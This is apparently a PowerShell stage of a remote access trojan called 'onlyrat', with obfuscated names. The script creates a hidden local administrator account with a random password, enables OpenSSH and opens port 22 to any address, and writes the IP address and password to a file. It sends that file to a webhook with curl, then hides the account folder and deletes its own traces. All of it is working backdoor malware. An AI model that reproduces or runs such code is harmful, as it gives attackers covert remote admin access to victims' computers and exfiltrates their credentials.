function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes

# registry
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force

# =============== SSH SECTION - FIXED ===============
# ssh installation
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start SSH service
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Create SSH directory
New-Item -ItemType Directory -Path "$env:USERPROFILE\.ssh" -Force
ssh-keyscan -H localhost >> "$env:USERPROFILE\.ssh\known_hosts" 2>$null

# FIREWALL RULES - CRITICAL FIX FOR EXTERNAL CONNECTIONS
# Remove existing SSH rules if they exist
Remove-NetFirewallRule -Name "OpenSSH-Server" -ErrorAction SilentlyContinue
Remove-NetFirewallRule -Name "SSH-Allow-All" -ErrorAction SilentlyContinue

# Create NEW firewall rule for ALL profiles (Domain, Private, Public)
New-NetFirewallRule -Name "SSH-Allow-All" `
  -DisplayName "SSH Allow All Inbound" `
  -Enabled True `
  -Direction Inbound `
  -Protocol TCP `
  -LocalPort 22 `
  -RemoteAddress Any `
  -Profile Domain,Private,Public `
  -Action Allow

# Also allow outbound for SSH (optional, but good for reverse tunnels)
New-NetFirewallRule -Name "SSH-Allow-Outbound" `
  -DisplayName "SSH Allow Outbound" `
  -Enabled True `
  -Direction Outbound `
  -Protocol TCP `
  -LocalPort 22 `
  -RemoteAddress Any `
  -Profile Domain,Private,Public `
  -Action Allow

# Restart SSH to apply all changes
Restart-Service sshd

# Test SSH locally
Start-Sleep -Seconds 2
Test-NetConnection -ComputerName localhost -Port 22
# =============== END SSH SECTION ===============

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

New-Item -Path $CRYnrkaDbe -Force
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
Add-Content -Path $CRYnrkaDbe -Value "22" -Force # SSH PORT - MUST BE 22 FOR LOCAL CONNECTIONS
Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type

# send file to webhook
$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"

# cleanup
attrib +h +s +r C:/Users/onlyrat 
Remove-Item $CRYnrkaDbe -Force
Remove-Item lawFvVTikZ.txt -Force
Remove-Item KFPGaEYdcz.ps1 -Force

# Optional: Display success message
Write-Host "[+] SSH Server installed and configured on port 22" -ForegroundColor Green
Write-Host "[+] Firewall rules added for all network profiles" -ForegroundColor Green
Write-Host "[+] .rat configuration file sent to webhook" -ForegroundColor Green
